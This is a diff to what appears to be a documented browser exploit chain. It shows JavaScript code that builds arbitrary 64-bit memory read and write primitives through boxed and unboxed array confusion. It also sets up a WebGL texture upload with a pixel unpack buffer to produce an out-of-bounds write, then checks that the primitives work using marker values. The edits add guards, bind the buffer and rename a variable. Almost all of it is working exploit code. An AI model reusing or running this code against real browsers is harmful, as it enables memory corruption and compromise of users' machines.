@@ -34,22 +34,24 @@ boxed_arr[0] = preAllocatedTargets.stage6FuncB;
 leakedAddrs.stage6FuncB = ftoi(unboxed_arr[0]);
 
 // Stage 1 read/write primitive construction via inline slot access
-exploitState.read64 = function(addr) {
-    unboxed_arr[0] = itof(addr - 0x10n);
-    const v = boxed_arr[0].slot0;
-    if (typeof v === 'number') return ftoi(v);
-    if ((typeof v === 'object' && v !== null) || typeof v === 'function') {
-        boxed_arr[0] = v;
-        const bits = ftoi(unboxed_arr[0]);
-        boxed_arr[0] = preAllocatedTargets.testObject;
-        return bits;
-    }
-    return 0x7ff8000000000000n;
-};
-exploitState.write64 = function(addr, val) {
-    unboxed_arr[0] = itof(addr - 0x10n);
-    boxed_arr[0].slot0 = itof(val);
-};
+if (inlineSelfWorks && arbReadWorks && arbWriteWorks) {
+    exploitState.read64 = function(addr) {
+        unboxed_arr[0] = itof(addr - 0x10n);
+        const v = boxed_arr[0].slot0;
+        if (typeof v === 'number') return ftoi(v);
+        if ((typeof v === 'object' && v !== null) || typeof v === 'function') {
+            boxed_arr[0] = v;
+            const bits = ftoi(unboxed_arr[0]);
+            boxed_arr[0] = preAllocatedTargets.testObject;
+            return bits;
+        }
+        return 0x7ff8000000000000n;
+    };
+    exploitState.write64 = function(addr, val) {
+        unboxed_arr[0] = itof(addr - 0x10n);
+        boxed_arr[0].slot0 = itof(val);
+    };
+}
 ```
 
 ### Stage 2: GPU canary harness setup
@@ -76,6 +78,7 @@ const allocatedSize = (width * 4) * unpackImageHeight;
 const actualWriteSize = (width * 4) * height;
 const oobWriteSize = Math.max(0, actualWriteSize - allocatedSize);
 
+gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
 gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, unpackImageHeight);
 gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
               width, height, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
@@ -124,7 +127,7 @@ This stage is specifically designed to avoid stale-address or self-consistent fa
 
 ```javascript
 const jsBefore = ftoi(stage5Probe.slot0);
-const v = exploitState.read64(candidate.addr + 0x10n);
+const v = exploitState.read64(selected.addr + 0x10n);
 const ok = (v === jsBefore) && (v !== 0x7ff8000000000000n);
 
 exploitState.write64(slot0Addr, writeMarkerWord);
